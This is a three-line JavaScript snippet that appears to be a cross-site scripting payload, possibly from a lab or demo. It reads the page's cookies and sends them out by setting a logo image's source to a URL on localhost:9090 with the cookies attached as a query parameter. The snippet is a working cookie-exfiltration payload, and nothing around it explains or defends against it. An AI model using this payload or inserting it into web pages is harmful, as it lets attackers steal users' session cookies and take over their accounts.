

var cookies = document.cookie;

var logo = document.getElementById("logo");

logo.src = 'http://localhost:9090/img/xss?userCookies=' + cookies;





